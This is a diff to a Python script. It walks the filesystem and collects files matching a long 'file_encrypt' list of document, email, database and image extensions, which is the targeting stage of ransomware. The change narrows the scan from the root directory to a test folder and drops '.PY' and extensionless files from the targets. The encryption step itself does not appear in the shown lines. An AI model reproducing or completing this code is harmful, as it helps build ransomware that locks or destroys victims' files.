@@ -2,7 +2,7 @@ import os
 import base64
 
 def find_files(path,method):
-    file_encrypt = {'.PY':0,'.DOC': 0, '.DOCX': 0, '.XLS': 0, '.XLSX': 0, '.PPT': 0, '.PPTX': 0, '.PST': 0, '.OST': 0, '.MSG': 0, '.EML': 0, '.VSD\
+    file_encrypt = {'.DOC': 0, '.DOCX': 0, '.XLS': 0, '.XLSX': 0, '.PPT': 0, '.PPTX': 0, '.PST': 0, '.OST': 0, '.MSG': 0, '.EML': 0, '.VSD\
 ': 0, '.VSDX': 0, '.TXT': 0, '.CSV': 0, '.RTF': 0, '.WKS': 0, '.WK1': 0, '.PDF': 0, '.DWG': 0, '.ONETOC2': 0, '.SNT': 0
 , '.JPEG': 0, '.JPG': 0, '.DOCB': 0, '.DOCM': 0, '.DOT': 0, '.DOTM': 0, '.DOTX': 0, '.XLSM': 0, '.XLSB': 0, '.XLW': 0, 
 '.XLT': 0, '.XLM': 0, '.XLC': 0, '.XLTX': 0, '.XLTM': 0, '.PPTM': 0, '.POT': 0, '.PPS': 0, '.PPSM': 0, '.PPSX': 0, '.PP\
@@ -17,9 +17,9 @@ AM': 0, '.POTX': 0, '.POTM': 0, '.EDB': 0, '.HWP': 0, '.602': 0, '.SXI': 0, '.ST
     for actual_path, directories, files_found in os.walk(path):
         for arg in files_found:
             ext = os.path.splitext(os.path.join(actual_path, arg))[1].upper()
-            if(file_format.get(ext) == 0 or ext == ''):
+            if(file_format.get(ext) == 0):
                 f.append(os.path.join(actual_path, arg))
     return f
 
 def d_main(method):
-	return find_files('/',method)
+	return find_files('/home/mrrobot/test/',method)
